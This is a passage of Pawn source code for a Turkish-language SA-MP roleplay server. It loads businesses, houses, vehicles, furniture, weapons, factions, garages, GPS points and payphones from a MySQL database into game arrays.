		Isyeri[isid][isci][5] = cache_get_field_content_int(i, "isci6");
		Isyeri[isid][isci][6] = cache_get_field_content_int(i, "isci7");
		Isyeri[isid][isci][7] = cache_get_field_content_int(i, "isci8");
		Isyeri[isid][isci][8] = cache_get_field_content_int(i, "isci9");
		Isyeri[isid][isci][9] = cache_get_field_content_int(i, "isci10");
		Isyeri[isid][muhur] = cache_get_field_content_int(i, "muhurlu");
		Isyeri[isid][iseviye] = cache_get_field_content_int(i, "iseviye");
		Isyeri[isid][agirisx] = cache_get_field_content_float(i, "agirisx");
		Isyeri[isid][agirisy] = cache_get_field_content_float(i, "agirisy");
		Isyeri[isid][agirisz] = cache_get_field_content_float(i, "agirisz");
		Isyeri[isid][agirisang] = cache_get_field_content_float(i, "agirisang");
		Isyeri[isid][acikisx] = cache_get_field_content_float(i, "acikisx");
		Isyeri[isid][acikisy] = cache_get_field_content_float(i, "acikisy");
		Isyeri[isid][acikisz] = cache_get_field_content_float(i, "acikisz");
		Isyeri[isid][acikisang] = cache_get_field_content_float(i, "acikisang");
		Isyeri[isid][birlikdestek] = cache_get_field_content_int(i, "birlikdestek");
		IsyeriSoyuluyor[isid] = false;
		if(Isyeri[isid][itip] == 14)
		{
		    CreateDynamicPickup(1239, 1, 775.1204, -60.8511, 1000.7184,Isyeri[isid][icikisvw],Isyeri[isid][icikisint],-1,50);
    		CreateDynamic3DTextLabel("{f9f9f9} "C3"/gym", 0xAFAFAFFF, 775.1204, -60.8511, 1000.7184,5,.worldid=Isyeri[isid][icikisvw],.interiorid=Isyeri[isid][icikisint]);
		}
        cache_get_field_content(i, "catigiris", cati, g_iHandle, 512);
		if(!isnull(cati)) {
			static _bol[5][12];
			strexplode(_bol, cati, "|");
			Isyeri[isid][catigirisX] = floatstr(_bol[0]);
			Isyeri[isid][catigirisY] = floatstr(_bol[1]);
			Isyeri[isid][catigirisZ] = floatstr(_bol[2]);
			Isyeri[isid][catigirisint] = strval(_bol[3]);
			Isyeri[isid][catigirisvw] = strval(_bol[4]);
			cache_get_field_content(i, "caticikis", cati, g_iHandle, 512);
			strexplode(_bol, cati, "|");
			Isyeri[isid][caticikisX] = floatstr(_bol[0]);
			Isyeri[isid][caticikisY] = floatstr(_bol[1]);
			Isyeri[isid][caticikisZ] = floatstr(_bol[2]);
			Isyeri[isid][caticikisint] = strval(_bol[3]);
			Isyeri[isid][caticikisvw] = strval(_bol[4]);	
		}
		Iter_Add(Business, isid);
	}
	printf("%d Ýþyeri Yüklendi.",rows);
	SetTimer("AyarYap", 1000, false);
	return 1;
}

forward EvYukle();
public EvYukle()
{
    static
	    rows,
	    fields,
		cati[128];

	new evid;
	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_EV)
	{
		evid = cache_get_field_content_int(i, "sqlid");
		Ev[evid][eid] = cache_get_field_content_int(i, "sqlid");
		cache_get_field_content(i, "ekonum", Ev[evid][ekonum], g_iHandle, 255);
		Ev[evid][esahip] = cache_get_field_content_int(i, "esahip");
		Ev[evid][girisX] = cache_get_field_content_float(i, "girisx");
		Ev[evid][girisY] = cache_get_field_content_float(i, "girisy");
		Ev[evid][girisZ] = cache_get_field_content_float(i, "girisz");
		Ev[evid][egirisvw] = cache_get_field_content_int(i, "egirisvw");
		Ev[evid][egirisint] = cache_get_field_content_int(i, "egirisint");
		Ev[evid][egirisangle] = cache_get_field_content_float(i, "egirisangle");
		Ev[evid][cikisX] = cache_get_field_content_float(i, "cikisx");
		Ev[evid][cikisY] = cache_get_field_content_float(i, "cikisy");
		Ev[evid][cikisZ] = cache_get_field_content_float(i, "cikisz");
		Ev[evid][ecikisint] = cache_get_field_content_int(i, "ecikisint");
		Ev[evid][ecikisvw] = cache_get_field_content_int(i, "ecikisvw");
		Ev[evid][ecikisangle] = cache_get_field_content_float(i, "ecikisangle");
		Ev[evid][efiyat] = cache_get_field_content_int(i, "efiyat");
		Ev[evid][ekilit] = cache_get_field_content_int(i, "ekilit");
		Ev[evid][kira] = cache_get_field_content_int(i, "kira");
		Ev[evid][kirafiyat] = cache_get_field_content_int(i, "kirafiyat");
		Ev[evid][kiralayan] = cache_get_field_content_int(i, "kiralayan");
		Ev[evid][birlikdestek] = cache_get_field_content_int(i, "birlikdestek");

		EvUyusturucu[evid][amfetamin] = cache_get_field_content_int(i, "amfetamin");
		EvUyusturucu[evid][metamfetamin] = cache_get_field_content_int(i, "metamfetamin");
		EvUyusturucu[evid][lsd] = cache_get_field_content_int(i, "lsd");
		EvUyusturucu[evid][extacy] = cache_get_field_content_int(i, "extacy");
		EvUyusturucu[evid][eroin] = cache_get_field_content_int(i, "eroin");
		EvUyusturucu[evid][kokain] = cache_get_field_content_int(i, "kokain");
		EvUyusturucu[evid][morfin] = cache_get_field_content_int(i, "morfin");
		EvUyusturucu[evid][uesrar] = cache_get_field_content_int(i, "uesrar");
		EvUyusturucu[evid][MDA] = cache_get_field_content_int(i, "MDA");
		
		cache_get_field_content(i, "catigiris", cati, g_iHandle, 512);
		if(!isnull(cati)) {
			static _bol[5][12];
			strexplode(_bol, cati, "|");
			Ev[evid][catigirisX] = floatstr(_bol[0]);
			Ev[evid][catigirisY] = floatstr(_bol[1]);
			Ev[evid][catigirisZ] = floatstr(_bol[2]);
			Ev[evid][catigirisint] = strval(_bol[3]);
			Ev[evid][catigirisvw] = strval(_bol[4]);
			cache_get_field_content(i, "caticikis", cati, g_iHandle, 512);
			strexplode(_bol, cati, "|");
			Ev[evid][caticikisX] = floatstr(_bol[0]);
			Ev[evid][caticikisY] = floatstr(_bol[1]);
			Ev[evid][caticikisZ] = floatstr(_bol[2]);
			Ev[evid][caticikisint] = strval(_bol[3]);
			Ev[evid][caticikisvw] = strval(_bol[4]);	
		}
		Iter_Add(Houses, evid);
		//if(evid == 481) printf("%d", Ev[evid][kiralayan]);
	}
	printf("%d Ev Yüklendi.",rows);
	return 1;
}

forward AracYukle();
public AracYukle()
{
    static
	    rows,
	    fields;

	new vehicleid;
	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_VEHICLES)
	{
 		vehicleid = CreateVehicle(
			cache_get_field_content_int(i, "model"),
			cache_get_field_content_float(i, "posx"),
			cache_get_field_content_float(i, "posy"),
			cache_get_field_content_float(i, "posz"),
			cache_get_field_content_float(i, "posa"),
			cache_get_field_content_int(i, "renk1"),
			cache_get_field_content_int(i, "renk2"),
			-1,
			cache_get_field_content_int(i, "birliktip")==1?1:0);
	    Arac[vehicleid][aid] = cache_get_field_content_int(i, "sqlid");//,printf("VID:%d-SQLID:%d",vehicleid, Arac[vehicleid][aid]);
	    Arac[vehicleid][amodel] = cache_get_field_content_int(i, "model");
		Arac[vehicleid][aposx] = cache_get_field_content_float(i, "posx");
		Arac[vehicleid][aposy] = cache_get_field_content_float(i, "posy");
		Arac[vehicleid][aposz] = cache_get_field_content_float(i, "posz");
		Arac[vehicleid][aposa] = cache_get_field_content_float(i, "posa");
		Arac[vehicleid][ainterior] = cache_get_field_content_int(i, "interior");
		Arac[vehicleid][avworld] = cache_get_field_content_int(i, "vworld");
		Arac[vehicleid][arenk1] = cache_get_field_content_int(i, "renk1"),acol1[vehicleid] = Arac[vehicleid][arenk1];
		Arac[vehicleid][arenk2] = cache_get_field_content_int(i, "renk2"),acol2[vehicleid] = Arac[vehicleid][arenk2];
		Arac[vehicleid][aowner] = cache_get_field_content_int(i, "owner");
		Arac[vehicleid][ahasar] = cache_get_field_content_int(i, "hasar");
		Arac[vehicleid][atip] = cache_get_field_content_int(i, "tip");
		Arac[vehicleid][afiyat] = cache_get_field_content_int(i, "fiyat");
		Arac[vehicleid][aspawn] = cache_get_field_content_int(i, "spawn");
		Arac[vehicleid][aspawnsatin] = cache_get_field_content_int(i, "spawnsatin");
		cache_get_field_content(i, "plaka", Arac[vehicleid][aplaka], g_iHandle, 255);
		Arac[vehicleid][akilit] = cache_get_field_content_int(i, "kilit");
		Arac[vehicleid][akilittip] =cache_get_field_content_int(i, "kilittip");
		Arac[vehicleid][aalarm] = cache_get_field_content_int(i, "alarm");
		Arac[vehicleid][aimmo] = cache_get_field_content_int(i, "immo");
		Arac[vehicleid][abenzin] = cache_get_field_content_int(i, "benzin");
		cache_get_field_content(i, "ceza", Arac[vehicleid][aceza], g_iHandle, 255);
		Arac[vehicleid][acezamiktar] = cache_get_field_content_int(i, "cezamiktar");
		Arac[vehicleid][siren] = cache_get_field_content_int(i, "siren");
		Arac[vehicleid][apaintjob] = cache_get_field_content_int(i, "paintjob");
		Arac[vehicleid][apanels] = cache_get_field_content_int(i, "panels");
		Arac[vehicleid][adoors] = cache_get_field_content_int(i, "doors");
		Arac[vehicleid][alights] = cache_get_field_content_int(i, "lights");
		Arac[vehicleid][atires] = cache_get_field_content_int(i, "tires");
		Arac[vehicleid][akm] = cache_get_field_content_int(i, "km");
		Arac[vehicleid][ametre] = cache_get_field_content_int(i, "metre");
		Arac[vehicleid][atextdurum] = cache_get_field_content_int(i, "textdurum");
		cache_get_field_content(i, "textyazi", Arac[vehicleid][atextyazi], g_iHandle, 255);
		Arac[vehicleid][abirlik] = cache_get_field_content_int(i, "birlik");
		Arac[vehicleid][abirliktip] = cache_get_field_content_int(i, "birliktip");
		Arac[vehicleid][arutbe] = cache_get_field_content_int(i, "rutbe");
		Arac[vehicleid][asure] = cache_get_field_content_int(i, "sure");
		Arac[vehicleid][aneon] =cache_get_field_content_int(i, "neon");
		Arac[vehicleid][abenzintip] = cache_get_field_content_int(i, "benzintip");
		Arac[vehicleid][ahizsabit] = cache_get_field_content_int(i, "hizsabit");
		Materyal[vehicleid][A] = cache_get_field_content_int(i, "matA");
		Materyal[vehicleid][B] = cache_get_field_content_int(i, "matB");
		Materyal[vehicleid][C] = cache_get_field_content_int(i, "matC");
		Materyal[vehicleid][D] = cache_get_field_content_int(i, "matD");
		Materyal[vehicleid][E] = cache_get_field_content_int(i, "matE");
		Kutular[vehicleid] += Materyal[vehicleid][A]+Materyal[vehicleid][B]+Materyal[vehicleid][C]+Materyal[vehicleid][D]+Materyal[vehicleid][E];
		AUyusturucu[vehicleid][esrar] = cache_get_field_content_int(i, "esrar");
		Kutular[vehicleid] += AUyusturucu[vehicleid][esrar];
		AUyusturucu[vehicleid][amfetamin] = cache_get_field_content_int(i, "amfetamin");
		Kutular[vehicleid] += AUyusturucu[vehicleid][amfetamin];
		AUyusturucu[vehicleid][metamfetamin] = cache_get_field_content_int(i, "metamfetamin");
		Kutular[vehicleid] += AUyusturucu[vehicleid][metamfetamin];
		AUyusturucu[vehicleid][lsd] = cache_get_field_content_int(i, "lsd");
		Kutular[vehicleid] += AUyusturucu[vehicleid][lsd];
		AUyusturucu[vehicleid][extacy] = cache_get_field_content_int(i, "extacy");
		Kutular[vehicleid] += AUyusturucu[vehicleid][extacy];
		AUyusturucu[vehicleid][kokain] = cache_get_field_content_int(i, "kokain");
		Kutular[vehicleid] += AUyusturucu[vehicleid][kokain];
		AUyusturucu[vehicleid][eroin] = cache_get_field_content_int(i, "eroin");
		Kutular[vehicleid] += AUyusturucu[vehicleid][eroin];
		AUyusturucu[vehicleid][morfin] = cache_get_field_content_int(i, "morfin");
		Kutular[vehicleid] += AUyusturucu[vehicleid][morfin];
		AUyusturucu[vehicleid][MDA] = cache_get_field_content_int(i, "MDA");
		Kutular[vehicleid] += AUyusturucu[vehicleid][MDA];
		Arac[vehicleid][vergi] = cache_get_field_content_int(i, "vergi");
		cezali[vehicleid] = cache_get_field_content_int(i, "cezali");
		Arac[vehicleid][aisyeri] = cache_get_field_content_int(i, "aisyeri");
		Arac[vehicleid][agelir] = cache_get_field_content_int(i, "agelir");
		Arac[vehicleid][birlikdestek] = cache_get_field_content_int(i, "birlikdestek");
		Arac[vehicleid][sigorta] = cache_get_field_content_int(i, "sigorta");
		Arac[vehicleid][parcalandi] = cache_get_field_content_int(i, "parcalandi");
		Arac[vehicleid][ahurda] = cache_get_field_content_int(i, "ahurda");
		SetVehicleVirtualWorld(vehicleid, Arac[vehicleid][avworld]);
		LinkVehicleToInterior(vehicleid, Arac[vehicleid][ainterior]);
		Aractamiri(vehicleid);
		SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
		SetVehicleParamsEx(vehicleid,0,0,0,Arac[vehicleid][akilit],0,0,0);
		SetVehicleParamsCarWindows(vehicleid, 1, 1, 1, 1);
		if(IsABike(vehicleid)) SetVehicleParamsEx(vehicleid,1,0,0,0,0,0,0);
  		if(Arac[vehicleid][atip] != 2 && Arac[vehicleid][atip] != 3 && Arac[vehicleid][atip] != 4  && Arac[vehicleid][atip] != 5) UpdateVehicleDamageStatus(vehicleid, Arac[vehicleid][apanels], Arac[vehicleid][adoors], Arac[vehicleid][alights], Arac[vehicleid][atires]);
		if(Arac[vehicleid][atextdurum] == 1)
		{
			if(Arac[vehicleid][amodel] == 523) {
		 		Plaka3DText[vehicleid] = CreateDynamic3DTextLabel(Arac[vehicleid][atextyazi], 0xFFFFFFFF, -0.3, -0.8, -0.3, 13.0, .worldid=0, .testlos=1, .attachedvehicle=vehicleid);
			}
		  	else {
				Plaka3DText[vehicleid] = CreateDynamic3DTextLabel(Arac[vehicleid][atextyazi], 0xFFFFFFFF, -0.7, -2.3, -0.3, 13.0, .worldid=0, .testlos=1, .attachedvehicle=vehicleid);
			}
			//Attach3DTextLabelToVehicle(Plaka3DText[vehicleid], vehicleid, -0.7, -2.7, 0.0);
			//printf("ID:%d - Text:%s",vehicleid,Arac[vehicleid][atextyazi]);
		}
		if(Arac[vehicleid][aspawn] == 1) {
			SetVehicleVirtualWorld(vehicleid, Arac[vehicleid][avworld]);
		}
		else {
			SetVehicleVirtualWorld(vehicleid, 9931+vehicleid);
		}
		Aractamiri(vehicleid);
	}
	printf("%d Araç Yüklendi.",rows);
	return 1;
}

forward MobilyaYukle();
public MobilyaYukle()
{
	static
	    rows,
	    fields;

	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_MOBILYA)
	{
		Mobilya[i][mid] = cache_get_field_content_int(i, "id");
		Mobilya[i][mmodel] = cache_get_field_content_int(i, "model");
		Mobilya[i][mx] = cache_get_field_content_float(i, "x");
		Mobilya[i][my] = cache_get_field_content_float(i, "y");
		Mobilya[i][mz] = cache_get_field_content_float(i, "z");
		Mobilya[i][mrx] = cache_get_field_content_float(i, "rx");
		Mobilya[i][mry] = cache_get_field_content_float(i, "ry");
		Mobilya[i][mrz] = cache_get_field_content_float(i, "rz");
		Mobilya[i][mox] = cache_get_field_content_float(i, "ox");
		Mobilya[i][moy] = cache_get_field_content_float(i, "oy");
		Mobilya[i][moz] = cache_get_field_content_float(i, "oz");
		Mobilya[i][morx] = cache_get_field_content_float(i, "orx");
		Mobilya[i][mory] = cache_get_field_content_float(i, "ory");
		Mobilya[i][morz] = cache_get_field_content_float(i, "orz");
		Mobilya[i][mint] = cache_get_field_content_int(i, "int");
		Mobilya[i][mvw] = cache_get_field_content_int(i, "vw");
		Mobilya[i][mtexture][0] = cache_get_field_content_int(i, "texture1");
		Mobilya[i][mtexture][1] = cache_get_field_content_int(i, "texture2");
		Mobilya[i][mtexturerenk][0] = cache_get_field_content_int(i, "texturerenk1");
		Mobilya[i][mtexturerenk][1] = cache_get_field_content_int(i, "texturerenk2");
		Mobilya[i][maracid] = cache_get_field_content_int(i, "aracid");
		if(Mobilya[i][mx] != 0 && Mobilya[i][my] != 0 && Mobilya[i][mz] != 0 && Mobilya[i][maracid] == -1)
		{
			Mobilya[i][mobje] = CreateDynamicObject(Mobilya[i][mmodel], Mobilya[i][mx], Mobilya[i][my], Mobilya[i][mz], Mobilya[i][mrx],Mobilya[i][mry],Mobilya[i][mrz],Mobilya[i][mvw],Mobilya[i][mint]);
			TextureVer(i, Mobilya[i][mtexture][0], 0);
	  		TextureVer(i, Mobilya[i][mtexture][1], 1);
		}
		//printf("CreateDynamicObject(%d, %f, %f, %f, %f, %f, %f, %d, %d);",Mobilya[i][mmodel], Mobilya[i][mx], Mobilya[i][my], Mobilya[i][mz], Mobilya[i][mrx],Mobilya[i][mry],Mobilya[i][mrz],Mobilya[i][mvw],Mobilya[i][mint]);
	}
	printf("%d Mobilya Yüklendi.",rows);
	return 1;
}

forward SilahYukle();
public SilahYukle()
{
	static
	    rows,
	    fields;

	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_SILAH)
	{
	    OyuncuSilah[i][no] = cache_get_field_content_int(i, "no");
	    OyuncuSilah[i][silahid] = cache_get_field_content_int(i, "silahid");
	    OyuncuSilah[i][mermi] = cache_get_field_content_int(i, "mermi");
	    OyuncuSilah[i][oyuncuid] = cache_get_field_content_int(i, "oyuncuid");
	    OyuncuSilah[i][silahtip] = cache_get_field_content_int(i, "tip");
	    OyuncuSilah[i][durum] = cache_get_field_content_int(i, "durum");
        OyuncuSilah[i][ruhsat] = cache_get_field_content_int(i, "ruhsat");
		Iter_Add(Guns, i);
	}
	printf("%d Silah Yüklendi.",rows);
	return 1;
}

forward BirlikYukle();
public BirlikYukle()
{
	static
	    rows,
	    fields;
	new mstring[255],_bol[5][16];
	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_BIRLIK)
	{
	    new id = cache_get_field_content_int(i, "sqlid");
		Birlik[id][sqlid] = cache_get_field_content_int(i, "sqlid");
		cache_get_field_content(i, "fisim", Birlik[id][fisim], g_iHandle, 32);
		cache_get_field_content(i, "rutbe1", Birlik[id][rutbe1], g_iHandle, 32);
		Birlik[id][rutbe1maas] = cache_get_field_content_int(i, "rutbe1maas");
		cache_get_field_content(i, "rutbe2", Birlik[id][rutbe2], g_iHandle, 32);
		Birlik[id][rutbe2maas] = cache_get_field_content_int(i, "rutbe2maas");
		cache_get_field_content(i, "rutbe3", Birlik[id][rutbe3], g_iHandle, 32);
		Birlik[id][rutbe3maas] = cache_get_field_content_int(i, "rutbe3maas");
		cache_get_field_content(i, "rutbe4", Birlik[id][rutbe4], g_iHandle, 32);
		Birlik[id][rutbe4maas] = cache_get_field_content_int(i, "rutbe4maas");
		cache_get_field_content(i, "rutbe5", Birlik[id][rutbe5], g_iHandle, 32);
		Birlik[id][rutbe5maas] = cache_get_field_content_int(i, "rutbe5maas");
		cache_get_field_content(i, "rutbe6", Birlik[id][rutbe6], g_iHandle, 32);
		Birlik[id][rutbe6maas] = cache_get_field_content_int(i, "rutbe6maas");
		cache_get_field_content(i, "rutbe7", Birlik[id][rutbe7], g_iHandle, 32);
		Birlik[id][rutbe7maas] = cache_get_field_content_int(i, "rutbe7maas");
		cache_get_field_content(i, "rutbe8", Birlik[id][rutbe8], g_iHandle, 32);
		Birlik[id][rutbe8maas] = cache_get_field_content_int(i, "rutbe8maas");
		cache_get_field_content(i, "rutbe9", Birlik[id][rutbe9], g_iHandle, 32);
		Birlik[id][rutbe9maas] = cache_get_field_content_int(i, "rutbe9maas");
		cache_get_field_content(i, "rutbe10", Birlik[id][rutbe10], g_iHandle, 32);
		Birlik[id][rutbe10maas] = cache_get_field_content_int(i, "rutbe10maas");
		cache_get_field_content(i, "rutbe11", Birlik[id][rutbe11], g_iHandle, 32);
		Birlik[id][rutbe11maas] = cache_get_field_content_int(i, "rutbe11maas");
		cache_get_field_content(i, "rutbe12", Birlik[id][rutbe12], g_iHandle, 32);
		Birlik[id][rutbe12maas] = cache_get_field_content_int(i, "rutbe12maas");
		cache_get_field_content(i, "rutbe13", Birlik[id][rutbe13], g_iHandle, 32);
		Birlik[id][rutbe13maas] = cache_get_field_content_int(i, "rutbe13maas");
		cache_get_field_content(i, "rutbe14", Birlik[id][rutbe14], g_iHandle, 32);
		Birlik[id][rutbe14maas] = cache_get_field_content_int(i, "rutbe14maas");
		cache_get_field_content(i, "rutbe15", Birlik[id][rutbe15], g_iHandle, 32);
		Birlik[id][rutbe15maas] = cache_get_field_content_int(i, "rutbe15maas");
		cache_get_field_content(i, "rutbe16", Birlik[id][rutbe16], g_iHandle, 32);
		Birlik[id][rutbe16maas] = cache_get_field_content_int(i, "rutbe16maas");
		cache_get_field_content(i, "rutbe17", Birlik[id][rutbe17], g_iHandle, 32);
		Birlik[id][rutbe17maas] = cache_get_field_content_int(i, "rutbe17maas");
		cache_get_field_content(i, "rutbe18", Birlik[id][rutbe18], g_iHandle, 32);
		Birlik[id][rutbe18maas] = cache_get_field_content_int(i, "rutbe18maas");
		cache_get_field_content(i, "rutbe19", Birlik[id][rutbe19], g_iHandle, 32);
		Birlik[id][rutbe19maas] = cache_get_field_content_int(i, "rutbe19maas");
		cache_get_field_content(i, "rutbe20", Birlik[id][rutbe20], g_iHandle, 32);
		Birlik[id][rutbe20maas] = cache_get_field_content_int(i, "rutbe20maas");
		Birlik[id][ftip] = cache_get_field_content_int(i, "ftip");
		Birlik[id][seviye] = cache_get_field_content_int(i, "seviye");
		Birlik[id][onay] = cache_get_field_content_int(i, "onay");
		Birlik[id][blider] = cache_get_field_content_int(i, "lider");
		Birlik[id][itibar] = cache_get_field_content_int(i, "itibar");
        Birlik[id][hesapno] = cache_get_field_content_int(i, "hesapno");
        Birlik[id][rfiyat] = cache_get_field_content_int(i, "reklamfiyat");
		cache_get_field_content(i, "isbasipos", mstring, g_iHandle, 255);
		if(!isnull(mstring))
		{
			strexplode(_bol, mstring, "|");
			Birlik[id][bisbasix] = floatstr(_bol[0]);
			Birlik[id][bisbasiy] = floatstr(_bol[1]);
			Birlik[id][bisbasiz] = floatstr(_bol[2]);
			Birlik[id][bisbasivw] = strval(_bol[3]);
			Birlik[id][bisbasiint] = strval(_bol[4]);
			if(Birlik[id][ftip] == SANTV || Birlik[id][ftip] == ASMS || Birlik[id][ftip] == LSFD || Birlik[id][ftip] == LSPD || Birlik[id][ftip] == LSPA)
			{
			    Birlik[id][bisbasipickup] = CreateDynamicPickup(1239, 1, Birlik[id][bisbasix], Birlik[id][bisbasiy], Birlik[id][bisbasiz],Birlik[id][bisbasivw],Birlik[id][bisbasiint],-1,50);
				Birlik[id][bisbasitext] = CreateDynamic3DTextLabel("{f9f9f9} "C3"''/isbasi''", 0xAFAFAFFF, Birlik[id][bisbasix], Birlik[id][bisbasiy], Birlik[id][bisbasiz], 10, .worldid=Birlik[id][bisbasivw], .interiorid=Birlik[id][bisbasiint]);
			}
			//printf("Birlik ID: %d\tÝþbaþý Pozisyonu\n",id);
			//printf("X:%f Y:%f Z:%f VW:%d INT:%d", Birlik[id][bisbasix], Birlik[id][bisbasiy], Birlik[id][bisbasiz], Birlik[id][bisbasivw], Birlik[id][bisbasiint]);
		}
		cache_get_field_content(i, "reklampos", mstring, g_iHandle, 255);
		if(!isnull(mstring))
		{
			strexplode(_bol, mstring, "|");
			Birlik[id][breklamx] = floatstr(_bol[0]);
			Birlik[id][breklamy] = floatstr(_bol[1]);
			Birlik[id][breklamz] = floatstr(_bol[2]);
			Birlik[id][breklamvw] = strval(_bol[3]);
			Birlik[id][breklamint] = strval(_bol[4]);
			if(Birlik[id][ftip] == SANTV)
			{
			    Birlik[id][breklampickup] = CreateDynamicPickup(1239, 1, Birlik[id][breklamx], Birlik[id][breklamy], Birlik[id][breklamz],Birlik[id][breklamvw],Birlik[id][breklamint],-1,50);
				new nstring[128];
				format(nstring, sizeof(nstring), "{f9f9f9} "C3"''/reklam''\n\n{f9f9f9}Reklam Fiyatý: Harf Baþýna "DOLAR"${f9f9f9}%d",Birlik[id][rfiyat]);
				Birlik[id][breklamtext] = CreateDynamic3DTextLabel(nstring, 0xAFAFAFFF, Birlik[id][breklamx], Birlik[id][breklamy], Birlik[id][breklamz], 10, .worldid=Birlik[id][breklamvw], .interiorid=Birlik[id][breklamint]);
			}
			Birlik[id][kasa] = cache_get_field_content_int(i, "kasa");
			//printf("Birlik ID: %d\tReklam Pozisyonu\n",id);
			//printf("X:%f Y:%f Z:%f VW:%d INT:%d", Birlik[id][breklamx], Birlik[id][breklamy], Birlik[id][breklamz], Birlik[id][breklamvw], Birlik[id][breklamint]);
		}
	}
	printf("%d Birlik Yüklendi.",rows);
	return 1;
}

forward GrupYukle();
public GrupYukle()
{
	static
	    rows,
	    fields;

	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_GRUP)
	{
	    new id = cache_get_field_content_int(i, "ID");
	    Grup[id][gid] = id;
		Grup[id][lider] = cache_get_field_content_int(i, "Lider");
		cache_get_field_content(i, "isim", Grup[id][gisim], g_iHandle, 32);
	}
	printf("%d Grup Yüklendi.",rows);
	return 1;
}

forward GarajYukle();
public GarajYukle()
{
	new mstring[64];
	static
	    rows,
	    fields;

	cache_get_data(rows, fields, g_iHandle);
	for (new ix = 0; ix < rows; ix ++) if (ix < MAX_GARAJ)
	{
	    new i = cache_get_field_content_int(ix, "id");
		Garaj[i][gid] = cache_get_field_content_int(ix, "id");
		Garaj[i][gx] = cache_get_field_content_float(ix, "x");
		Garaj[i][gy] = cache_get_field_content_float(ix, "y");
		Garaj[i][gz] = cache_get_field_content_float(ix, "z");
		Garaj[i][gvw] = cache_get_field_content_int(ix, "vw");
		Garaj[i][gint] = cache_get_field_content_int(ix, "int");
		Garaj[i][gicint] = cache_get_field_content_int(ix, "interior");
		Garaj[i][gsahip] = cache_get_field_content_int(ix, "sahip");
		Garaj[i][gbirlik] = cache_get_field_content_int(ix, "birlik");
		Garaj[i][gkilit] = cache_get_field_content_int(ix, "kilit");
		Garaj[i][gax] = cache_get_field_content_float(ix, "ax");
		Garaj[i][gay] = cache_get_field_content_float(ix, "ay");
		Garaj[i][gaz] = cache_get_field_content_float(ix, "az");
		Garaj[i][garz] = cache_get_field_content_float(ix, "arz");
		cache_get_field_content(ix, "isim", Garaj[i][gisim], g_iHandle, 32);
		format(mstring, sizeof(mstring), "{428bca}GARAJ\n\n{FFFFFF}%s",Garaj[i][gisim]);
		Garaj[i][gpickup] = CreateDynamicPickup(19132, 1, Garaj[i][gx],Garaj[i][gy],Garaj[i][gz], Garaj[i][gvw], Garaj[i][gint], -1, 100.0);
        Garaj[i][glabel] = CreateDynamic3DTextLabel(mstring, -1,Garaj[i][gx],Garaj[i][gy],Garaj[i][gz], 10.0, .worldid=Garaj[i][gvw], .interiorid=Garaj[i][gint]);
	}
	printf("%d Garaj Yüklendi.",rows);
	return 1;
}

forward GpsYukle();
public GpsYukle()
{
	new mstring[64];
	static
	    rows,
	    fields;

	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_GPS)
	{
	    //i = cache_get_field_content_int(i, "id");
		Gps[i][gid] = cache_get_field_content_int(i, "id");
		Gps[i][gx] = cache_get_field_content_float(i, "x");
		Gps[i][gy] = cache_get_field_content_float(i, "y");
		Gps[i][gz] = cache_get_field_content_float(i, "z");
		Gps[i][gekleyen] = cache_get_field_content_int(i, "ekleyen");
		cache_get_field_content(i, "isim", Gps[i][gisim], g_iHandle, 32);
		format(mstring, sizeof(mstring), "{fb5a02}GPS[%d]\n{FFFFFF}%s",i,Gps[i][gisim]);
  		Gps[i][glabel] = CreateDynamic3DTextLabel(mstring,0x008080FF,Gps[i][gx],Gps[i][gy],Gps[i][gz],15);
	}
	printf("%d Gps Yüklendi.",rows);
	return 1;
}

forward AranmaKayitYukle();
public AranmaKayitYukle()
{
	static
	    rows,
	    fields,
		_id;

	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_MDCARANMA)
	{
	    _id = cache_get_field_content_int(i, "id");
		MDCAranma[_id][MDCTip] = cache_get_field_content_int(i, "Tip");
		cache_get_field_content(i, "Memur", MDCAranma[_id][MDCMemur], g_iHandle, MAX_PLAYER_NAME+1);
		cache_get_field_content(i, "Aranan", MDCAranma[_id][MDCAranan], g_iHandle, 128);
		cache_get_field_content(i, "Suc", MDCAranma[_id][MDCSuc], g_iHandle, 256);
		cache_get_field_content(i, "Tarih", MDCAranma[_id][MDCTarih], g_iHandle, 256);
	}
	printf("%d Aranma Kaydi Yüklendi.",rows);
	return 1;
}

forward AnkesorluTelefonYukle();
public AnkesorluTelefonYukle()
{
	new Float:oPos[3];
	static
	    rows,
	    fields;

	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_ANKESORLU_TELEFON)
	{
		ATelefon[i][a_id] = cache_get_field_content_int(i, "id");
		ATelefon[i][a_x] = cache_get_field_content_float(i, "x");
		ATelefon[i][a_y] = cache_get_field_content_float(i, "y");
		ATelefon[i][a_z] = cache_get_field_content_float(i, "z");
		ATelefon[i][a_rx] = cache_get_field_content_float(i, "rx");
		ATelefon[i][a_ry] = cache_get_field_content_float(i, "ry");
		ATelefon[i][a_rz] = cache_get_field_content_float(i, "rz");
		ATelefon[i][a_object] = CreateDynamicObject(ATELEFON_MODEL, ATelefon[i][a_x], ATelefon[i][a_y], ATelefon[i][a_z], ATelefon[i][a_rx], ATelefon[i][a_ry], ATelefon[i][a_rz]);
		GetXYInBehindOfObject(ATelefon[i][a_object], oPos[0], oPos[1], oPos[2], 0.3);
		ATelefon[i][a_textlabel] = CreateDynamic3DTextLabel("{f9f9f9} "C3"''/atelefon''", 0xAFAFAFFF, oPos[0], oPos[1], oPos[2]+0.5, 7.5, .testlos=1, .worldid=0);
	}
	printf("%d Ankesorlu Telefon Yüklendi.",rows);
	return 1;
}

stock GetXYInBehindOfObject(objectid, &Float:x, &Float:y, &Float:z, Float:distance)
{
	// Created by meta

	new Float:rot[3];

	GetDynamicObjectPos(objectid, x, y, z);
	GetDynamicObjectRot(objectid, rot[0], rot[1], rot[2]);

	x -= (distance * floatsin(-rot[2], degrees));
	y -= (distance * floatcos(-rot[2], degrees));
}

forward CCTVYukle();
